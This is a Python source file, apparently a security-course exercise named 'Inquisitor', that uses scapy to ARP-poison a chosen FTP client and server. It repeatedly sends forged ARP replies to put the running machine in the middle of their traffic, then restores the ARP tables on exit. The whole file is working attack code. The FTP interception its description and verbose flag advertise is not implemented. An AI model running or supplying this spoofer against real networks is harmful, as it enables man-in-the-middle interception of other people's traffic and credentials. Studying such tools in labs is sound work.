#!/usr/bin/env python3
import sys
import re
import argparse
import ipaddress
import signal
import time
import scapy.all as scapy

def error_exit(message):
    print(f"[!] Error: {message}")
    sys.exit(1)
    
# ─── Inquisitor ─────────────────────────────────────────────────

class Inquisitor:
    def __init__(self, args):
        self.ip_src = args.ip_src
        self.mac_src = args.mac_src
        self.ip_target = args.ip_target
        self.mac_target = args.mac_target
        self.verbose = args.verbose
        self.poisoning = False
        self.my_mac = scapy.get_if_hwaddr(scapy.conf.iface)
        
    def spoof(self, ip_target, mac_target, ip_src, src_mac=None, count=1):
        packet = scapy.Ether(dst=mac_target) / scapy.ARP(
            op=2,
            pdst=ip_target,
            hwdst=mac_target,
            psrc=ip_src,
            hwsrc=src_mac or self.my_mac
        )
        scapy.sendp(packet, iface=scapy.conf.iface, verbose=0, count=count)
        
    def poison_arp(self):
        print(f"[*] Poisoning {self.ip_src} <-> {self.ip_target}")
        self.poisoning = True
        while self.poisoning:
            self.spoof(self.ip_target, self.mac_target, self.ip_src)
            self.spoof(self.ip_src, self.mac_src, self.ip_target)
            time.sleep(2)
    
    def restore_arp(self):
        print("[*] Restoring ARP tables...")
        self.poisoning = False
        self.spoof(self.ip_src, self.mac_src, self.ip_target, self.mac_target, count=5)
        self.spoof(self.ip_target, self.mac_target, self.ip_src, self.mac_src, count=5)
        print("[*] ARP tables restored.")
        
    def run(self):
        print(f"[*] Starting Inquisitor: src={self.ip_src} ({self.mac_src}) "
              f"-> target={self.ip_target} ({self.mac_target}), verbose={self.verbose}")
        signal.signal(signal.SIGINT, self.stop)
        self.poison_arp()
    
    def stop(self, signum, frame):
        print("\n[*] Stopping Inquisitor...")
        self.restore_arp()
        sys.exit(0)
    
# ─── Validation ─────────────────────────────────────────────────
    
def is_valid_ip(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except:
        return False
    
def is_valid_mac(mac):
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')
    return bool(mac_pattern.match(mac))
    
def validate_args(args):
    if not is_valid_ip(args.ip_src):
        error_exit("Invalid IP-src format (must be IPv4)")
    if not is_valid_ip(args.ip_target):
        error_exit("Invalid IP-target format (must be IPv4)")
    if not is_valid_mac(args.mac_src):
        error_exit("Invalid MAC-src format")
    if not is_valid_mac(args.mac_target):
        error_exit("Invalid MAC-target format")
    if args.ip_src == args.ip_target or args.mac_src == args.mac_target:
        error_exit("Source and target must be different")
    
def parse_args():
    parser = argparse.ArgumentParser(description="Inquisitor: ARP poisoning and FTP Interception Tool")
    parser.add_argument("ip_src", help="IP of FTP client")
    parser.add_argument("mac_src", help="MAC of FTP client")
    parser.add_argument("ip_target", help="IP of FTP server")
    parser.add_argument("mac_target", help="MAC of FTP server")
    parser.add_argument('-v', '--verbose', action='store_true', help='show all FTP traffic')
    return parser.parse_args()

# ─── Main ───────────────────────────────────────────────────────

def main():
    try:
        args = parse_args()
        validate_args(args)
        Inquisitor(args).run()
    except Exception as e:
        error_exit(e)

if __name__ == '__main__':
    main()